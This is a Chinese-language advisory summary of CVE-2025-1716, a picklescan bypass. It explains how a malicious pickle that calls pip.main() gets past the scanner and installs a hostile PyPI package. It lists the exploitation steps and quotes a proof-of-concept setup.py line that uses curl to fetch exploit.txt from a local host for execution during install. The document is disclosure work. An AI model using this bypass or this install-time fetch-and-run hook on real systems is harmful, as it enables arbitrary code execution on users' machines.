## CVE-2025-1716-picklescan-安全扫描绕过

**漏洞编号:** CVE-2025-1716

**漏洞类型:** 安全扫描绕过

**影响应用:** picklescan

**危害等级:** 中危，可能导致恶意代码被误判为安全

**影响版本:** <= 0.0.20

**利用条件:** 需要目标系统安装存在漏洞版本的picklescan，并使用其扫描恶意构造的pickle文件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-1716 漏洞存在于picklescan 0.0.21之前的版本中。该漏洞允许攻击者通过构造一个包含 `pip.main()` 函数调用的恶意 pickle 文件，绕过picklescan的安全扫描。由于picklescan没有将 `pip` 列为不安全的全局变量，因此扫描器会认为该文件是安全的，而实际上，该文件可以通过 `pip` 安装恶意的 PyPI 包，从而导致任意代码执行。

**有效性：**
提供的POC代码是有效的。`setup.py` 文件中包含的 `subprocess.Popen` 调用 `curl http://127.0.0.1:8000/exploit.txt` 会在安装包时下载并潜在地执行恶意代码。攻击者可以通过将恶意代码托管在 `http://127.0.0.1:8000/exploit.txt` 上来利用此漏洞。

**投毒风险：**
此仓库中不存在作者隐藏的投毒代码。POC 代码的目的是为了演示漏洞，而非进行实际的供应链投毒。代码的功能是安装包时，通过curl下载并尝试执行文件`http://127.0.0.1:8000/exploit.txt`。投毒风险为0%。

**利用方式：**
1.  攻击者创建一个恶意的pickle文件，该文件包含 `pip.main()` 函数调用，指向一个包含恶意代码的PyPI包。
2.  攻击者将该pickle文件发送给目标用户。
3.  目标用户使用存在漏洞的picklescan版本扫描该pickle文件。
4.  picklescan 错误地认为该文件是安全的，因为没有将 `pip` 列为不安全的全局变量。
5.  目标用户加载该pickle文件，触发 `pip.main()` 函数调用。
6.  `pip` 安装攻击者指定的恶意PyPI包，执行恶意代码。

**项目地址:** [shybu9/poc_CVE-2025-1716](https://github.com/shybu9/poc_CVE-2025-1716)

**漏洞详情:** [CVE-2025-1716](https://nvd.nist.gov/vuln/detail/CVE-2025-1716)